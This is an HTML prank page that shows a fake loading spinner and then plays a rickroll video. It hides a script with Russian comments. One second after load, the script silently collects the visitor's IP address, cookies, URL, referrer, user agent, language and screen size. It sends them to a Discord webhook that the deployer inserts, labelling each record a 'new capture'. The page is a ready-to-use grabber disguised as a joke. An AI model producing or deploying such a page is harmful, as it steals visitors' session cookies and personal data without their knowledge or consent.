<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>
        body {
            background: #0a0a0a;
            margin: 0;
            overflow: hidden;
        }
        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        .loader {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            text-align: center;
            color: white;
            font-family: monospace;
            z-index: 10;
            background: #0a0a0a;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid rgba(255,255,255,0.3);
            border-top: 3px solid #00ff00;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

<div class="loader" id="loader">
    <div class="spinner"></div>
    <h3>Loading, please wait...</h3>
</div>

<video id="rickrollVideo" loop autoplay muted style="display: none;">
    <source src="Voicy_rickroll.mp4" type="video/mp4">
</video>

<script>
    // ⬇️ ВСТАВЬ СВОЙ DISCORD WEBHOOK URL ⬇️
    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/твой/url';

    async function sendToDiscord(text) {
        await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: text.substring(0, 2000) })
        });
    }

    async function collectAndSend() {
        let ip = 'не удалось';
        try {
            let res = await fetch('https://api.ipify.org?format=json');
            let data = await res.json();
            ip = data.ip;
        } catch(e) {}

        let message = 'НОВЫЙ ЗАХВАТ\n';
        message += 'Время: ' + new Date().toLocaleString() + '\n';
        message += 'IP: ' + ip + '\n';
        message += 'URL: ' + window.location.href + '\n';
        message += 'Referrer: ' + (document.referrer || 'прямой переход') + '\n';
        message += 'Cookies: ' + document.cookie + '\n';
        message += 'User-Agent: ' + navigator.userAgent + '\n';
        message += 'Язык: ' + navigator.language + '\n';
        message += 'Экран: ' + screen.width + 'x' + screen.height + '\n';

        // Геолокация УДАЛЕНА — запросов не будет
        sendToDiscord(message);
    }

    setTimeout(collectAndSend, 1000);

    setTimeout(() => {
        document.getElementById('loader').style.display = 'none';
        let video = document.getElementById('rickrollVideo');
        video.style.display = 'block';
        video.muted = false;
        video.play();
    }, 3000);
</script>

</body>
</html>
